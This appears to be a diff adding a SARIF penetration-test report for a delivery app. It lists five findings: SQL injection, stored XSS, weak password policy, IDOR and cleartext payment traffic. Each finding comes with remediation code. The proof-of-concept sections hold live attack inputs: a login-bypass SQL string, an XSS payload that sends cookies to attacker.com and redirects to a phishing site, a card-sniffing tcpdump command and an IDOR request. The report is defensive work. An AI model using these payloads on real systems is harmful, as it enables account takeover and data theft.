@@ -1,0 +1,370 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Getir Security Team - Penetration Test",
+          "semanticVersion": "3.0.0",
+          "informationUri": "https://security.getir.com",
+          "organization": "Getir Cybersecurity Operations",
+          "rules": [
+            {
+              "id": "PENTEST-SEC-1234",
+              "name": "SEC_1234",
+              "shortDescription": {
+                "text": "SQL Injection Vulnerability in Authentication System"
+              },
+              "fullDescription": {
+                "text": "A critical SQL injection vulnerability exists in the user authentication endpoint. User-supplied input is directly concatenated into SQL queries without any sanitization or parameterization, allowing attackers to manipulate queries and bypass authentication controls.\n\n**Complete system compromise possible:** Attackers can bypass authentication, extract sensitive user data including passwords and PII, modify or delete database records, and potentially gain administrative access to the entire system."
+              },
+              "help": {
+                "text": "JIRA: SEC-1234\nCVSS: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\nCWE: CWE-89 - SQL Injection\nOWASP: A03:2021 - Injection\n\n**Immediate actions required:**\n\n1. Replace string concatenation with parameterized queries\n2. Use ORM methods (e.g., Sequelize, TypeORM) that handle escaping\n3. Implement input validation with whitelist approach\n4. Add Web Application Firewall (WAF) rules\n5. Enable database query logging for monitoring\n\n**Code example:**\n```javascript\n// \u274c VULNERABLE\nconst query = `SELECT * FROM users WHERE username='${username}'`;\n\n// \u2705 SECURE\nconst query = 'SELECT * FROM users WHERE username = ?';\ndb.execute(query, [username]);\n```",
+                "markdown": "# SQL Injection Vulnerability in Authentication System\n\nA critical SQL injection vulnerability exists in the user authentication endpoint. User-supplied input is directly concatenated into SQL queries without any sanitization or parameterization, allowing attackers to manipulate queries and bypass authentication controls.\n\n## Impact\n\n**Complete system compromise possible:** Attackers can bypass authentication, extract sensitive user data including passwords and PII, modify or delete database records, and potentially gain administrative access to the entire system.\n\n## Proof of Concept\n\n```http\nPOST /api/auth/login\nContent-Type: application/json\n\n{\n  \"username\": \"admin' OR '1'='1'--\",\n  \"password\": \"anything\"\n}\n```\n\nThis payload bypasses authentication and returns admin session token.\n\n## Remediation\n\n**Immediate actions required:**\n\n1. Replace string concatenation with parameterized queries\n2. Use ORM methods (e.g., Sequelize, TypeORM) that handle escaping\n3. Implement input validation with whitelist approach\n4. Add Web Application Firewall (WAF) rules\n5. Enable database query logging for monitoring\n\n**Code example:**\n```javascript\n// \u274c VULNERABLE\nconst query = `SELECT * FROM users WHERE username='${username}'`;\n\n// \u2705 SECURE\nconst query = 'SELECT * FROM users WHERE username = ?';\ndb.execute(query, [username]);\n```\n\n## Metadata\n\n- **JIRA:** [SEC-1234](https://jira.getir.com/browse/SEC-1234)\n- **CVSS:** 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`\n- **CWE:** CWE-89 - SQL Injection\n- **OWASP:** A03:2021 - Injection\n- **Assignee:** backend-team@getir.com\n- **Status:** Open\n- **Effort:** High (2-4 hours)\n- **Risk:** Active exploitation in the wild. Automated scanners can detect this.\n- **Compliance:** Violates PCI-DSS 6.5.1, OWASP ASVS 5.3.4"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "sql-injection",
+                  "authentication",
+                  "database",
+                  "critical",
+                  "cwe-89",
+                  "owasp-a03",
+                  "backend"
+                ],
+                "precision": "very-high",
+                "security-severity": "9.8"
+              }
+            },
+            {
+              "id": "PENTEST-SEC-1235",
+              "name": "SEC_1235",
+              "shortDescription": {
+                "text": "Stored Cross-Site Scripting in User Comment System"
+              },
+              "fullDescription": {
+                "text": "The application uses React's `dangerouslySetInnerHTML` to render user-generated comments without any sanitization. This creates a persistent XSS vulnerability where malicious scripts are stored in the database and executed in every user's browser who views the comment.\n\n**User account compromise:** Attackers can inject malicious JavaScript that executes in victims' browsers, enabling session hijacking, credential theft, phishing attacks, malicious redirects, and unauthorized actions on behalf of users."
+              },
+              "help": {
+                "text": "JIRA: SEC-1235\nCVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:H/A:N)\nCWE: CWE-79 - Cross-Site Scripting\nOWASP: A03:2021 - Injection\n\n**Required fixes:**\n\n1. Remove `dangerouslySetInnerHTML` completely\n2. Use React's default text rendering (automatically escapes HTML)\n3. If rich text is needed, use DOMPurify library\n4. Implement Content Security Policy (CSP) headers\n\n**Secure code:**\n```jsx\n// \u274c VULNERABLE\n<div dangerouslySetInnerHTML={{__html: comment.text}} />\n\n// \u2705 SECURE - Simple text\n<div>{comment.text}</div>\n\n// \u2705 SECURE - Rich text with sanitization\nimport DOMPurify from 'dompurify';\n<div dangerouslySetInnerHTML={{\n  __html: DOMPurify.sanitize(comment.text)\n}} />\n```",
+                "markdown": "# Stored Cross-Site Scripting in User Comment System\n\nThe application uses React's `dangerouslySetInnerHTML` to render user-generated comments without any sanitization. This creates a persistent XSS vulnerability where malicious scripts are stored in the database and executed in every user's browser who views the comment.\n\n## Impact\n\n**User account compromise:** Attackers can inject malicious JavaScript that executes in victims' browsers, enabling session hijacking, credential theft, phishing attacks, malicious redirects, and unauthorized actions on behalf of users.\n\n## Proof of Concept\n\n```javascript\n// Submit this as a comment:\n<img src=x onerror=\"\n  fetch('https://attacker.com/steal?cookie='+document.cookie);\n  // Steal session tokens\n  localStorage.clear();\n  // Force logout and redirect to phishing site\n  window.location='https://fake-getir.com/login';\n\">\n```\n\nWhen any user views this comment, their session is hijacked.\n\n## Remediation\n\n**Required fixes:**\n\n1. Remove `dangerouslySetInnerHTML` completely\n2. Use React's default text rendering (automatically escapes HTML)\n3. If rich text is needed, use DOMPurify library\n4. Implement Content Security Policy (CSP) headers\n\n**Secure code:**\n```jsx\n// \u274c VULNERABLE\n<div dangerouslySetInnerHTML={{__html: comment.text}} />\n\n// \u2705 SECURE - Simple text\n<div>{comment.text}</div>\n\n// \u2705 SECURE - Rich text with sanitization\nimport DOMPurify from 'dompurify';\n<div dangerouslySetInnerHTML={{\n  __html: DOMPurify.sanitize(comment.text)\n}} />\n```\n\n## Metadata\n\n- **JIRA:** [SEC-1235](https://jira.getir.com/browse/SEC-1235)\n- **CVSS:** 7.5 `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:H/A:N`\n- **CWE:** CWE-79 - Cross-Site Scripting\n- **OWASP:** A03:2021 - Injection\n- **Assignee:** frontend-team@getir.com\n- **Status:** In Progress\n- **Effort:** Medium (1-2 hours)\n- **Risk:** Medium likelihood. Requires authenticated user account.\n- **Compliance:** Violates OWASP ASVS 5.3.3"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "xss",
+                  "stored-xss",
+                  "frontend",
+                  "high",
+                  "cwe-79",
+                  "owasp-a03",
+                  "react"
+                ],
+                "precision": "very-high",
+                "security-severity": "7.5"
+              }
+            },
+            {
+              "id": "PENTEST-SEC-1236",
+              "name": "SEC_1236",
+              "shortDescription": {
+                "text": "Inadequate Password Policy Enforcement"
+              },
+              "fullDescription": {
+                "text": "The application enforces only a 6-character minimum password requirement with no complexity rules, making user accounts vulnerable to brute force attacks, dictionary attacks, and credential stuffing campaigns.\n\n**Account takeover risk:** Weak passwords enable automated attacks. Common passwords like '123456' are accepted. Users from data breaches can be targeted with credential stuffing attacks."
+              },
+              "help": {
+                "text": "JIRA: SEC-1236\nCVSS: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)\nCWE: CWE-521 - Weak Password Requirements\nOWASP: A07:2021 - Identification and Authentication Failures\n\n**Implement NIST 800-63B password guidelines:**\n\n1. Minimum 12 characters (not 6)\n2. Check against compromised password databases (HaveIBeenPwned API)\n3. Require mix of character types\n4. Implement rate limiting (max 5 attempts per 15 minutes)\n5. Add account lockout after failed attempts\n6. Enable MFA for all accounts\n\n**Updated validation:**\n```javascript\nconst passwordRequirements = {\n  minLength: 12,\n  requireUppercase: true,\n  requireLowercase: true,\n  requireNumbers: true,\n  requireSpecialChars: true\n};\n\n// Check against breach database\nawait checkPasswordBreaches(password);\n```",
+                "markdown": "# Inadequate Password Policy Enforcement\n\nThe application enforces only a 6-character minimum password requirement with no complexity rules, making user accounts vulnerable to brute force attacks, dictionary attacks, and credential stuffing campaigns.\n\n## Impact\n\n**Account takeover risk:** Weak passwords enable automated attacks. Common passwords like '123456' are accepted. Users from data breaches can be targeted with credential stuffing attacks.\n\n## Proof of Concept\n\n```bash\n# Successfully create account with weak password\ncurl -X POST https://api.getir.com/register \\\n  -d '{\"username\":\"testuser\",\"password\":\"123456\"}'\n\n# Account created successfully with trivial password\n```\n\n## Remediation\n\n**Implement NIST 800-63B password guidelines:**\n\n1. Minimum 12 characters (not 6)\n2. Check against compromised password databases (HaveIBeenPwned API)\n3. Require mix of character types\n4. Implement rate limiting (max 5 attempts per 15 minutes)\n5. Add account lockout after failed attempts\n6. Enable MFA for all accounts\n\n**Updated validation:**\n```javascript\nconst passwordRequirements = {\n  minLength: 12,\n  requireUppercase: true,\n  requireLowercase: true,\n  requireNumbers: true,\n  requireSpecialChars: true\n};\n\n// Check against breach database\nawait checkPasswordBreaches(password);\n```\n\n## Metadata\n\n- **JIRA:** [SEC-1236](https://jira.getir.com/browse/SEC-1236)\n- **CVSS:** 5.3 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`\n- **CWE:** CWE-521 - Weak Password Requirements\n- **OWASP:** A07:2021 - Identification and Authentication Failures\n- **Assignee:** security-team@getir.com\n- **Status:** Open\n- **Effort:** Low (30 minutes)\n- **Risk:** Constant automated attacks targeting common passwords.\n- **Compliance:** Violates NIST 800-63B, PCI-DSS 8.2.3"
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "properties": {
+                "tags": [
+                  "authentication",
+                  "password-policy",
+                  "compliance",
+                  "medium",
+                  "cwe-521",
+                  "owasp-a07"
+                ],
+                "precision": "very-high",
+                "security-severity": "5.3"
+              }
+            },
+            {
+              "id": "PENTEST-SEC-1237",
+              "name": "SEC_1237",
+              "shortDescription": {
+                "text": "Broken Access Control - IDOR in User Profile API"
+              },
+              "fullDescription": {
+                "text": "The user profile API endpoint accepts a `userId` parameter and returns profile data without verifying that the requesting user has authorization to view that profile. Any authenticated user can access any other user's personal information.\n\n**Mass data exposure:** Attackers can enumerate all user IDs and extract complete PII database including full names, email addresses, phone numbers, delivery addresses, and order history. **GDPR violation** with potential regulatory fines."
+              },
+              "help": {
+                "text": "JIRA: SEC-1237\nCVSS: 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)\nCWE: CWE-639 - Insecure Direct Object Reference\nOWASP: A01:2021 - Broken Access Control\n\n**Implement proper authorization:**\n\n1. Use session user ID, never accept userId from request\n2. Implement role-based access control (RBAC)\n3. Add authorization middleware\n4. Log all profile access attempts\n\n**Secure implementation:**\n```javascript\n// \u274c VULNERABLE\nrouter.get('/profile', async (req, res) => {\n  const userId = req.query.userId; // User-controlled!\n  const profile = await db.getUser(userId);\n  res.json(profile);\n});\n\n// \u2705 SECURE\nrouter.get('/profile', authMiddleware, async (req, res) => {\n  const userId = req.user.id; // From authenticated session\n  const profile = await db.getUser(userId);\n  res.json(profile);\n});\n```",
+                "markdown": "# Broken Access Control - IDOR in User Profile API\n\nThe user profile API endpoint accepts a `userId` parameter and returns profile data without verifying that the requesting user has authorization to view that profile. Any authenticated user can access any other user's personal information.\n\n## Impact\n\n**Mass data exposure:** Attackers can enumerate all user IDs and extract complete PII database including full names, email addresses, phone numbers, delivery addresses, and order history. **GDPR violation** with potential regulatory fines.\n\n## Proof of Concept\n\n```bash\n# Attacker with user ID 5000 can access user 1000's data\ncurl -H \"Authorization: Bearer <attacker_token>\" \\\n  https://api.getir.com/api/user/profile?userId=1000\n\n# Response contains victim's PII:\n{\n  \"id\": 1000,\n  \"email\": \"victim@email.com\",\n  \"phone\": \"+90 555 123 4567\",\n  \"address\": \"\u0130stanbul, Kad\u0131k\u00f6y, ...\",\n  \"orders\": [...]\n}\n```\n\n## Remediation\n\n**Implement proper authorization:**\n\n1. Use session user ID, never accept userId from request\n2. Implement role-based access control (RBAC)\n3. Add authorization middleware\n4. Log all profile access attempts\n\n**Secure implementation:**\n```javascript\n// \u274c VULNERABLE\nrouter.get('/profile', async (req, res) => {\n  const userId = req.query.userId; // User-controlled!\n  const profile = await db.getUser(userId);\n  res.json(profile);\n});\n\n// \u2705 SECURE\nrouter.get('/profile', authMiddleware, async (req, res) => {\n  const userId = req.user.id; // From authenticated session\n  const profile = await db.getUser(userId);\n  res.json(profile);\n});\n```\n\n## Metadata\n\n- **JIRA:** [SEC-1237](https://jira.getir.com/browse/SEC-1237)\n- **CVSS:** 8.1 `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`\n- **CWE:** CWE-639 - Insecure Direct Object Reference\n- **OWASP:** A01:2021 - Broken Access Control\n- **Assignee:** backend-team@getir.com\n- **Status:** Open\n- **Effort:** Medium (1-2 hours)\n- **Risk:** High. Easy to exploit. Automated scrapers can harvest all user data.\n- **Compliance:** GDPR Article 32, PCI-DSS 7.1 violation"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "idor",
+                  "authorization",
+                  "api-security",
+                  "high",
+                  "cwe-639",
+                  "owasp-a01",
+                  "privacy"
+                ],
+                "precision": "very-high",
+                "security-severity": "8.1"
+              }
+            },
+            {
+              "id": "PENTEST-SEC-1238",
+              "name": "SEC_1238",
+              "shortDescription": {
+                "text": "Missing TLS/HTTPS on Payment Processing Endpoint"
+              },
+              "fullDescription": {
+                "text": "The payment processing endpoint is accessible via unencrypted HTTP protocol. All payment card data, CVV codes, and personal information are transmitted in cleartext over the network, exposing them to interception.\n\n**Critical payment data exposure:** Man-in-the-middle attackers on the network path can intercept all payment card numbers, CVV codes, cardholder names, and billing addresses. **PCI-DSS Section 4.1 violation** - immediate compliance failure with potential fines up to $500,000 per incident. Payment processor may terminate merchant account."
+              },
+              "help": {
+                "text": "JIRA: SEC-1238\nCVSS: 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)\nCWE: CWE-319 - Cleartext Transmission of Sensitive Information\nOWASP: A02:2021 - Cryptographic Failures\n\n**URGENT ACTIONS - Deploy immediately:**\n\n1. Force HTTPS for ALL endpoints (especially payment)\n2. Configure nginx with strong TLS 1.3\n3. Implement HTTP to HTTPS redirect\n4. Enable HSTS header (max-age=31536000)\n5. Disable TLS 1.0/1.1, weak ciphers\n6. Get valid SSL certificate (Let's Encrypt)\n\n**Nginx configuration:**\n```nginx\n# Redirect HTTP to HTTPS\nserver {\n    listen 80;\n    return 301 https://$host$request_uri;\n}\n\nserver {\n    listen 443 ssl http2;\n    ssl_certificate /path/to/cert.pem;\n    ssl_certificate_key /path/to/key.pem;\n    \n    # Strong TLS configuration\n    ssl_protocols TLSv1.3 TLSv1.2;\n    ssl_ciphers 'ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256';\n    \n    # HSTS\n    add_header Strict-Transport-Security \"max-age=31536000\" always;\n    \n    location /payment/ {\n        proxy_pass http://payment-service:4000;\n    }\n}\n```",
+                "markdown": "# Missing TLS/HTTPS on Payment Processing Endpoint\n\nThe payment processing endpoint is accessible via unencrypted HTTP protocol. All payment card data, CVV codes, and personal information are transmitted in cleartext over the network, exposing them to interception.\n\n## Impact\n\n**Critical payment data exposure:** Man-in-the-middle attackers on the network path can intercept all payment card numbers, CVV codes, cardholder names, and billing addresses. **PCI-DSS Section 4.1 violation** - immediate compliance failure with potential fines up to $500,000 per incident. Payment processor may terminate merchant account.\n\n## Proof of Concept\n\n```bash\n# Sniff network traffic on public WiFi\nsudo tcpdump -i wlan0 -A | grep -i 'cardnumber\\|cvv'\n\n# Or simply access endpoint via HTTP\ncurl -v http://api.getir.com/payment/process \\\n  -d '{\n    \"cardNumber\": \"4111111111111111\",\n    \"cvv\": \"123\",\n    \"amount\": 100\n  }'\n\n# All data transmitted in cleartext!\n```\n\n## Remediation\n\n**URGENT ACTIONS - Deploy immediately:**\n\n1. Force HTTPS for ALL endpoints (especially payment)\n2. Configure nginx with strong TLS 1.3\n3. Implement HTTP to HTTPS redirect\n4. Enable HSTS header (max-age=31536000)\n5. Disable TLS 1.0/1.1, weak ciphers\n6. Get valid SSL certificate (Let's Encrypt)\n\n**Nginx configuration:**\n```nginx\n# Redirect HTTP to HTTPS\nserver {\n    listen 80;\n    return 301 https://$host$request_uri;\n}\n\nserver {\n    listen 443 ssl http2;\n    ssl_certificate /path/to/cert.pem;\n    ssl_certificate_key /path/to/key.pem;\n    \n    # Strong TLS configuration\n    ssl_protocols TLSv1.3 TLSv1.2;\n    ssl_ciphers 'ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256';\n    \n    # HSTS\n    add_header Strict-Transport-Security \"max-age=31536000\" always;\n    \n    location /payment/ {\n        proxy_pass http://payment-service:4000;\n    }\n}\n```\n\n## Metadata\n\n- **JIRA:** [SEC-1238](https://jira.getir.com/browse/SEC-1238)\n- **CVSS:** 9.1 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`\n- **CWE:** CWE-319 - Cleartext Transmission of Sensitive Information\n- **OWASP:** A02:2021 - Cryptographic Failures\n- **Assignee:** devops@getir.com\n- **Status:** Open\n- **Effort:** High (2-4 hours including testing)\n- **Risk:** IMMEDIATE. Active exploitation happening. Public WiFi users at extreme risk.\n- **Compliance:** PCI-DSS 4.1, 4.2 CRITICAL violation. ISO 27001:2013 A.10.1 failure."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "encryption",
+                  "tls",
+                  "https",
+                  "payment",
+                  "pci-dss",
+                  "critical",
+                  "cwe-319",
+                  "owasp-a02"
+                ],
+                "precision": "very-high",
+                "security-severity": "9.1"
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "PENTEST-SEC-1234",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] SQL Injection Vulnerability in Authentication System - CVSS 9.8 | CWE-89 | JIRA: SEC-1234 (https://jira.getir.com/browse/SEC-1234) | Assignee: backend-team@getir.com | A03:2021 - Injection"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/api/auth/login.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 45
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "SEC-1234-1762854499"
+          },
+          "properties": {
+            "jira_key": "SEC-1234",
+            "jira_url": "https://jira.getir.com/browse/SEC-1234",
+            "security-severity": "9.8",
+            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            "cwe_id": "CWE-89",
+            "cwe_name": "SQL Injection",
+            "owasp": "A03:2021 - Injection",
+            "priority": "Critical",
+            "severity": "critical",
+            "status": "Open",
+            "assignee": "backend-team@getir.com",
+            "effort": "High (2-4 hours)",
+            "risk_level": "Active exploitation in the wild. Automated scanners can detect this.",
+            "compliance_violations": "Violates PCI-DSS 6.5.1, OWASP ASVS 5.3.4"
+          }
+        },
+        {
+          "ruleId": "PENTEST-SEC-1235",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "[HIGH] Stored Cross-Site Scripting in User Comment System - CVSS 7.5 | CWE-79 | JIRA: SEC-1235 (https://jira.getir.com/browse/SEC-1235) | Assignee: frontend-team@getir.com | A03:2021 - Injection"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/components/Comment/CommentDisplay.jsx",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 78
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "SEC-1235-1762854499"
+          },
+          "properties": {
+            "jira_key": "SEC-1235",
+            "jira_url": "https://jira.getir.com/browse/SEC-1235",
+            "security-severity": "7.5",
+            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:H/A:N",
+            "cwe_id": "CWE-79",
+            "cwe_name": "Cross-Site Scripting",
+            "owasp": "A03:2021 - Injection",
+            "priority": "High",
+            "severity": "high",
+            "status": "In Progress",
+            "assignee": "frontend-team@getir.com",
+            "effort": "Medium (1-2 hours)",
+            "risk_level": "Medium likelihood. Requires authenticated user account.",
+            "compliance_violations": "Violates OWASP ASVS 5.3.3"
+          }
+        },
+        {
+          "ruleId": "PENTEST-SEC-1236",
+          "ruleIndex": 2,
+          "level": "warning",
+          "message": {
+            "text": "[MEDIUM] Inadequate Password Policy Enforcement - CVSS 5.3 | CWE-521 | JIRA: SEC-1236 (https://jira.getir.com/browse/SEC-1236) | Assignee: security-team@getir.com | A07:2021 - Identification and Authentication Failures"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/services/validation/userValidation.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 123
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "SEC-1236-1762854499"
+          },
+          "properties": {
+            "jira_key": "SEC-1236",
+            "jira_url": "https://jira.getir.com/browse/SEC-1236",
+            "security-severity": "5.3",
+            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+            "cwe_id": "CWE-521",
+            "cwe_name": "Weak Password Requirements",
+            "owasp": "A07:2021 - Identification and Authentication Failures",
+            "priority": "Medium",
+            "severity": "medium",
+            "status": "Open",
+            "assignee": "security-team@getir.com",
+            "effort": "Low (30 minutes)",
+            "risk_level": "Constant automated attacks targeting common passwords.",
+            "compliance_violations": "Violates NIST 800-63B, PCI-DSS 8.2.3"
+          }
+        },
+        {
+          "ruleId": "PENTEST-SEC-1237",
+          "ruleIndex": 3,
+          "level": "error",
+          "message": {
+            "text": "[HIGH] Broken Access Control - IDOR in User Profile API - CVSS 8.1 | CWE-639 | JIRA: SEC-1237 (https://jira.getir.com/browse/SEC-1237) | Assignee: backend-team@getir.com | A01:2021 - Broken Access Control"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/api/user/profile.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 67
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "SEC-1237-1762854499"
+          },
+          "properties": {
+            "jira_key": "SEC-1237",
+            "jira_url": "https://jira.getir.com/browse/SEC-1237",
+            "security-severity": "8.1",
+            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+            "cwe_id": "CWE-639",
+            "cwe_name": "Insecure Direct Object Reference",
+            "owasp": "A01:2021 - Broken Access Control",
+            "priority": "High",
+            "severity": "high",
+            "status": "Open",
+            "assignee": "backend-team@getir.com",
+            "effort": "Medium (1-2 hours)",
+            "risk_level": "High. Easy to exploit. Automated scrapers can harvest all user data.",
+            "compliance_violations": "GDPR Article 32, PCI-DSS 7.1 violation"
+          }
+        },
+        {
+          "ruleId": "PENTEST-SEC-1238",
+          "ruleIndex": 4,
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] Missing TLS/HTTPS on Payment Processing Endpoint - CVSS 9.1 | CWE-319 | JIRA: SEC-1238 (https://jira.getir.com/browse/SEC-1238) | Assignee: devops@getir.com | A02:2021 - Cryptographic Failures"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "infrastructure/nginx.conf",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 234
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "SEC-1238-1762854499"
+          },
+          "properties": {
+            "jira_key": "SEC-1238",
+            "jira_url": "https://jira.getir.com/browse/SEC-1238",
+            "security-severity": "9.1",
+            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+            "cwe_id": "CWE-319",
+            "cwe_name": "Cleartext Transmission of Sensitive Information",
+            "owasp": "A02:2021 - Cryptographic Failures",
+            "priority": "Critical",
+            "severity": "critical",
+            "status": "Open",
+            "assignee": "devops@getir.com",
+            "effort": "High (2-4 hours including testing)",
+            "risk_level": "IMMEDIATE. Active exploitation happening. Public WiFi users at extreme risk.",
+            "compliance_violations": "PCI-DSS 4.1, 4.2 CRITICAL violation. ISO 27001:2013 A.10.1 failure."
+          }
+        }
+      ]
+    }
+  ]
+}
